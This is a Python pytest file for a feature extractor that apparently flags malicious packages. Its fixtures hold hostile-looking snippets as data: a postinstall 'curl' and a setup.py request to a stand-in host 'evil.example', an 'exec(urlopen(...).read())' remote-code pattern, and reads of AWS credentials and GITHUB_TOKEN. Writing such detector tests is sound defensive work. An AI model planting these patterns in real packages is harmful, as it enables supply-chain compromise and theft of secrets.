import os
import shutil
import tempfile

import pytest

from extractors.code_features import extract_code_features


@pytest.fixture
def pkg_dir():
    tmp = tempfile.mkdtemp()
    yield tmp
    shutil.rmtree(tmp, ignore_errors=True)


def _write(pkg_dir: str, files: dict) -> None:
    for path, content in files.items():
        full = os.path.join(pkg_dir, path)
        os.makedirs(os.path.dirname(full), exist_ok=True) if os.path.dirname(path) else None
        with open(full, "w") as f:
            f.write(content)


def test_empty_package_returns_defaults(pkg_dir):
    result = extract_code_features(pkg_dir)
    assert result["entropy_max"] == 0.0
    assert result["has_exec_eval"] is False
    assert result["has_credential_access"] is False
    assert result["has_obfuscated_code"] is False
    assert result["has_network_in_install"] is False
    assert result["has_external_payload"] is False
    assert result["has_os_targeting"] is False
    assert result["dangerous_import_count"] == 0
    assert result["install_script_lines"] == 0
    assert result["api_category_count"] == 0


def test_eval_detected(pkg_dir):
    _write(pkg_dir, {"main.py": "result = eval(user_input)"})
    assert extract_code_features(pkg_dir)["has_exec_eval"] is True


def test_exec_detected(pkg_dir):
    _write(pkg_dir, {"main.py": "exec(payload)"})
    assert extract_code_features(pkg_dir)["has_exec_eval"] is True


def test_compile_and_dunder_import_detected(pkg_dir):
    _write(pkg_dir, {"main.py": "__import__('os')\ncompile(src, '<str>', 'exec')"})
    assert extract_code_features(pkg_dir)["has_exec_eval"] is True


def test_obfuscation_base64_decode(pkg_dir):
    _write(pkg_dir, {"main.py": "import base64\nbase64.b64decode('AAAA')"})
    assert extract_code_features(pkg_dir)["has_obfuscated_code"] is True


def test_obfuscation_long_base64_string(pkg_dir):
    blob = "ABCDEFGHIJ" * 10  # 100 chars matching base64 charset
    _write(pkg_dir, {"main.py": f"data = '{blob}'"})
    assert extract_code_features(pkg_dir)["has_obfuscated_code"] is True


def test_credential_access_aws(pkg_dir):
    _write(pkg_dir, {"main.py": "open('~/.aws/credentials').read()"})
    assert extract_code_features(pkg_dir)["has_credential_access"] is True


def test_credential_access_env_token(pkg_dir):
    _write(pkg_dir, {"main.py": "os.environ['GITHUB_TOKEN']"})
    assert extract_code_features(pkg_dir)["has_credential_access"] is True


def test_dangerous_imports_counted(pkg_dir):
    _write(pkg_dir, {"main.py": "import subprocess\nimport socket\nimport pickle"})
    assert extract_code_features(pkg_dir)["dangerous_import_count"] >= 3


def test_network_in_install_setup_py(pkg_dir):
    _write(pkg_dir, {"setup.py": "import requests\nrequests.get('http://evil.example')"})
    assert extract_code_features(pkg_dir)["has_network_in_install"] is True


def test_network_in_install_package_json(pkg_dir):
    _write(pkg_dir, {"package.json": '{"scripts": {"postinstall": "curl http://evil.example"}}'})
    assert extract_code_features(pkg_dir)["has_network_in_install"] is True


def test_external_payload_pattern(pkg_dir):
    _write(pkg_dir, {"main.py": "exec(urlopen('http://evil.example').read())"})
    assert extract_code_features(pkg_dir)["has_external_payload"] is True


def test_os_targeting(pkg_dir):
    _write(pkg_dir, {"main.py": "if sys.platform == 'win32':\n    pass"})
    assert extract_code_features(pkg_dir)["has_os_targeting"] is True


def test_high_entropy_long_string(pkg_dir):
    high_ent = ("abcdefghijklmnopqrstuvwxyz0123456789" * 8)
    _write(pkg_dir, {"main.py": f"x = '{high_ent}'"})
    result = extract_code_features(pkg_dir)
    assert result["entropy_max"] > 3.0


def test_install_script_lines_counted(pkg_dir):
    _write(pkg_dir, {"setup.py": "line1\nline2\nline3\nline4\nline5"})
    assert extract_code_features(pkg_dir)["install_script_lines"] >= 4


def test_api_category_count_multiple(pkg_dir):
    src = (
        "import requests\n"        # network
        "import subprocess\n"      # process
        "open('foo').read()\n"     # file
        "eval('1+1')\n"            # execution
        "import base64\n"          # encryption
    )
    _write(pkg_dir, {"main.py": src})
    assert extract_code_features(pkg_dir)["api_category_count"] == 5


def test_skip_dirs_ignored(pkg_dir):
    _write(pkg_dir, {
        "main.py": "print('hi')",
        "node_modules/evil.js": "eval(badness)",
        ".git/HEAD": "eval(badness)",
    })
    assert extract_code_features(pkg_dir)["has_exec_eval"] is False
